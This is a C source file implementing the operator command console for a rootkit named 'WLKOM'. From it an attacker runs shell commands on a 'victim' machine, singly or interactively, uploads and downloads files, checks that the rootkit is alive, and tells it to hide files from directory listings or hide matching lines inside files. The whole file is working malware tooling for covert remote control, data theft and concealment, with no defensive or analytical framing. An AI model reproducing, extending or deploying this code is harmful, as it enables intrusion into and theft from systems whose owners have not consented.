#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "../include/commands.h"

#define CMD_LINE_SIZE 1024

/**
 * @brief Expands a leading ~ to the HOME directory.
 * @param path    Input path (may start with ~).
 * @param out     Output buffer.
 * @param outsz   Size of output buffer.
 */
static void expand_tilde(const char *path, char *out, size_t outsz)
{
    const char *home;

    if (path[0] == '~')
    {
        home = getenv("HOME");
        if (home)
            snprintf(out, outsz, "%s%s", home, path + 1);
        else
            snprintf(out, outsz, "%s", path);
    }
    else
    {
        snprintf(out, outsz, "%s", path);
    }
}

/**
 * @brief Reads an entire file into a heap-allocated buffer.
 * @param path  Path to the file.
 * @param len   Output: number of bytes read.
 * @return Heap-allocated buffer (caller frees), or NULL on error.
 */
static char *read_file(const char *path, size_t *len)
{
    FILE   *f;
    char   *buf;
    size_t  ret;

    f = fopen(path, "rb");
    if (!f)
        return NULL;
    fseek(f, 0, SEEK_END);
    *len = ftell(f);
    rewind(f);
    buf = malloc(*len);
    if (!buf)
    {
        fclose(f);
        return NULL;
    }
    ret = fread(buf, 1, *len, f);
    fclose(f);
    if (ret != *len)
    {
        free(buf);
        return NULL;
    }
    return buf;
}

/**
 * @brief Writes @p len bytes from @p buf to @p path, creating or truncating it.
 * @param path  Destination file path.
 * @param buf   Data to write.
 * @param len   Number of bytes.
 * @return 0 on success, -1 on error.
 */
static int write_file(const char *path, const char *buf, size_t len)
{
    FILE *f;

    f = fopen(path, "wb");
    if (!f)
        return -1;
    fwrite(buf, 1, len, f);
    fclose(f);
    return 0;
}

/** @brief Prints the colored WLKOM control prompt. */
static void print_prompt(void)
{
    printf("\n\033[1;32mWLKOM\033[0m > ");
    fflush(stdout);
}

/** @brief Prints the list of available commands. */
static void print_help(void)
{
    printf("\n"
           "  \033[1;33mCommands\033[0m\n"
           "\n"
           "  \033[1mExecution\033[0m\n"
           "    exec [cmd]                    Run a command on victim (no args = interactive mode)\n"
           "    ping                          Check rootkit is alive\n"
           "\n"
           "  \033[1mFile transfer\033[0m\n"
           "    upload   <local> <remote>     Send a file to victim\n"
           "    download <remote> <local>     Get a file from victim\n"
           "\n"
           "  \033[1mHiding\033[0m\n"
           "    hide_file   <name>            Hide file/dir from ls\n"
           "    unhide_file <name>            Restore hidden file/dir\n"
           "    hide_line   <file> <pattern>  Hide lines matching pattern\n"
           "    unhide_line <file> <pattern>  Restore hidden lines\n"
           "\n"
           "  \033[1mSession\033[0m\n"
           "    help                          Show this help\n"
           "    exit                          Disconnect and quit\n"
           "\n"
           "  Paths can be quoted: upload \"/my path/a.txt\" \"/remote/b.txt\"\n"
           "\n");
}

/**
 * @brief Sends a ping and prints the rootkit's response.
 * @param c  Connected client.
 */
static void dispatch_ping(client_t *c)
{
    uint8_t  op;
    char    *resp    = NULL;
    uint32_t resp_len = 0;

    send_packet(c->fd, CMD_PING, NULL, 0);
    if (recv_packet(c->fd, &op, &resp, &resp_len) == 0 && op == CMD_PONG)
        printf("PONG\n");
    else
        printf("No response\n");
    free(resp);
}

/**
 * @brief Sends a shell command to execute on the victim and prints the output.
 * @param c     Connected client.
 * @param cmd   Command string (may contain spaces).
 */
static void exec_remote(client_t *c, const char *cmd)
{
    uint8_t  op;
    char    *resp    = NULL;
    uint32_t resp_len = 0;

    send_packet(c->fd, CMD_EXEC, cmd, strlen(cmd));
    if (recv_packet(c->fd, &op, &resp, &resp_len) == 0)
        printf("%.*s\n", (int)resp_len, resp ? resp : "");
    free(resp);
}

/**
 * @brief Interactive command loop: type commands, 'exit' to return to main menu.
 * @param c  Connected client.
 */
static void exec_interactive_loop(client_t *c)
{
    char line[CMD_LINE_SIZE];

    printf("\nEntering command mode (type 'exit' to return to main menu)\n");
    while (1)
    {
        printf("\nexec > ");
        fflush(stdout);
        if (!fgets(line, sizeof(line), stdin))
            break;
        line[strcspn(line, "\n")] = '\0';
        if (strlen(line) == 0)
            continue;
        if (strcmp(line, "exit") == 0)
            break;
        exec_remote(c, line);
    }
    printf("\nReturned to main menu\n");
}

/**
 * @brief Handles 'exec' command: interactive mode if no args, single exec if args.
 * @param c     Connected client.
 * @param args  Tokenized command line; args[1..] form the command.
 * @param argc  Number of tokens.
 */
static void dispatch_exec(client_t *c, char **args, int argc)
{
    char full[CMD_LINE_SIZE] = { 0 };
    int  i;

    if (argc < 2)
    {
        exec_interactive_loop(c);
        return;
    }
    for (i = 1; i < argc; i++)
    {
        strncat(full, args[i], sizeof(full) - strlen(full) - 1);
        if (i < argc - 1)
            strncat(full, " ", sizeof(full) - strlen(full) - 1);
    }
    exec_remote(c, full);
}

/**
 * @brief Uploads a local file to the victim at a remote path.
 * @param c     Connected client.
 * @param args  args[1] = local path, args[2] = remote path.
 * @param argc  Number of tokens (must be >= 3).
 */
static void dispatch_upload(client_t *c, char **args, int argc)
{
    size_t   file_len;
    size_t   path_len;
    size_t   total_len;
    char    *file_data;
    char    *payload;
    uint8_t  op;
    char    *resp    = NULL;
    uint32_t resp_len = 0;

    char local_path[CMD_LINE_SIZE];
    char remote_path[CMD_LINE_SIZE];

    if (argc < 3)
    {
        printf("Usage: upload <local_path> <remote_path>\n");
        return;
    }
    expand_tilde(args[1], local_path, sizeof(local_path));
    expand_tilde(args[2], remote_path, sizeof(remote_path));

    file_data = read_file(local_path, &file_len);
    if (!file_data)
    {
        printf("Cannot read local file: %s\n", local_path);
        return;
    }
    path_len  = strlen(remote_path) + 1;
    total_len = path_len + file_len;
    payload   = malloc(total_len);
    if (!payload)
    {
        free(file_data);
        return;
    }
    memcpy(payload, remote_path, path_len);
    memcpy(payload + path_len, file_data, file_len);
    free(file_data);
    send_packet(c->fd, CMD_UPLOAD, payload, total_len);
    free(payload);
    if (recv_packet(c->fd, &op, &resp, &resp_len) == 0)
        printf("Upload: %s\n", resp ? resp : "?");
    free(resp);
}

/**
 * @brief Downloads a file from the victim and saves it locally.
 * @param c     Connected client.
 * @param args  args[1] = remote path, args[2] = local path.
 * @param argc  Number of tokens (must be >= 3).
 */
static void dispatch_download(client_t *c, char **args, int argc)
{
    uint8_t  op;
    char    *resp    = NULL;
    uint32_t resp_len = 0;

    char local_path[CMD_LINE_SIZE];
    char remote_path[CMD_LINE_SIZE];

    if (argc < 3)
    {
        printf("Usage: download <remote_path> <local_path>\n");
        return;
    }
    expand_tilde(args[1], remote_path, sizeof(remote_path));
    expand_tilde(args[2], local_path, sizeof(local_path));

    send_packet(c->fd, CMD_DOWNLOAD, remote_path, strlen(remote_path));
    if (recv_packet(c->fd, &op, &resp, &resp_len) == 0)
    {
        if (resp && strncmp(resp, "FAIL", 4) != 0)
        {
            write_file(local_path, resp, resp_len);
            printf("Downloaded %u bytes -> %s\n", resp_len, local_path);
        }
        else
        {
            printf("Download failed\n");
        }
    }
    free(resp);
}

/**
 * @brief Sends a hide_file or unhide_file request for a single name.
 * @param c     Connected client.
 * @param args  args[1] = filename to hide/unhide.
 * @param argc  Number of tokens (must be >= 2).
 * @param hide  true to hide, false to unhide.
 */
static void dispatch_hide_file(client_t *c, char **args, int argc, int hide)
{
    uint8_t     opcode = hide ? CMD_HIDE_FILE : CMD_UNHIDE_FILE;
    const char *verb   = hide ? "hide_file" : "unhide_file";

    if (argc < 2)
    {
        printf("Usage: %s <name>\n", verb);
        return;
    }
    send_packet(c->fd, opcode, args[1], strlen(args[1]));
    printf("%s request sent: %s\n", verb, args[1]);
}

/**
 * @brief Sends a hide_line or unhide_line request (file + pattern).
 * @param c     Connected client.
 * @param cmd   Command string ("hide_line" or "unhide_line").
 * @param args  args[1] = filepath, args[2] = pattern.
 * @param argc  Number of tokens (must be >= 3).
 */
static void dispatch_hide_line(client_t *c, const char *cmd, char **args,
                               int argc)
{
    size_t  flen;
    size_t  plen;
    size_t  total;
    char   *payload;
    uint8_t opcode;

    if (argc < 3)
    {
        printf("Usage: %s <filepath> <pattern>\n", cmd);
        return;
    }
    opcode  = (strcmp(cmd, "hide_line") == 0) ? CMD_HIDE_LINE : CMD_UNHIDE_LINE;
    flen    = strlen(args[1]) + 1;
    plen    = strlen(args[2]);
    total   = flen + plen;
    payload = malloc(total);
    if (!payload)
        return;
    memcpy(payload, args[1], flen);
    memcpy(payload + flen, args[2], plen);
    send_packet(c->fd, opcode, payload, total);
    free(payload);
    printf("%s request sent\n", cmd);
}

/**
 * @brief Tokenizes @p line into @p args, respecting double-quoted strings.
 *        Quotes are stripped from the token. "a b" becomes one token: a b.
 * @param line  Input line (modified in place).
 * @param args  Output array of token pointers.
 * @param argc  Output token count.
 * @return 1 if at least one token was found, 0 if the line was empty.
 */
static int parse_args(char *line, char **args, int *argc)
{
    char *p;

    *argc = 0;
    line[strcspn(line, "\n")] = '\0';
    p = line;
    while (*p && *argc < MAX_ARGS)
    {
        while (*p == ' ')
            p++;
        if (*p == '\0')
            break;
        if (*p == '"')
        {
            p++;
            args[(*argc)++] = p;
            while (*p && *p != '"')
                p++;
            if (*p == '"')
                *p++ = '\0';
        }
        else
        {
            args[(*argc)++] = p;
            while (*p && *p != ' ')
                p++;
            if (*p == ' ')
                *p++ = '\0';
        }
    }
    return *argc > 0;
}

/**
 * @brief Dispatches one command line to the appropriate handler.
 * @param c     Connected client.
 * @param line  Raw input line (modified in place).
 * @return 0 to continue the loop, -1 to exit.
 */
static int dispatch(client_t *c, char *line)
{
    char       *args[MAX_ARGS];
    int         argc;
    const char *cmd;

    if (!parse_args(line, args, &argc))
        return 0;
    cmd = args[0];

    if (strcmp(cmd, "ping") == 0)          { dispatch_ping(c); return 0; }
    if (strcmp(cmd, "exec") == 0)          { dispatch_exec(c, args, argc); return 0; }
    if (strcmp(cmd, "upload") == 0)        { dispatch_upload(c, args, argc); return 0; }
    if (strcmp(cmd, "download") == 0)      { dispatch_download(c, args, argc); return 0; }
    if (strcmp(cmd, "hide_file") == 0)     { dispatch_hide_file(c, args, argc, 1); return 0; }
    if (strcmp(cmd, "unhide_file") == 0)   { dispatch_hide_file(c, args, argc, 0); return 0; }
    if (strcmp(cmd, "hide_line") == 0 ||
        strcmp(cmd, "unhide_line") == 0)   { dispatch_hide_line(c, cmd, args, argc); return 0; }
    if (strcmp(cmd, "help") == 0)          { print_help(); return 0; }
    if (strcmp(cmd, "exit") == 0 ||
        strcmp(cmd, "quit") == 0)          return -1;

    printf("Unknown command: %s  (type 'help')\n", cmd);
    return 0;
}

/**
 * @brief Runs the interactive command loop until the operator exits or the
 *        connection drops.
 * @param c  Connected and authenticated client.
 * @return 0 if client disconnected normally, 1 if operator typed 'exit'.
 */
int commands_loop(client_t *c)
{
    char line[CMD_LINE_SIZE];
    int  exit_cmd = 0;

    print_help();
    while (c->connected && c->authed)
    {
        print_prompt();
        if (!fgets(line, sizeof(line), stdin))
            break;
        if (dispatch(c, line) < 0)
        {
            exit_cmd = 1;
            break;
        }
    }
    return exit_cmd;
}
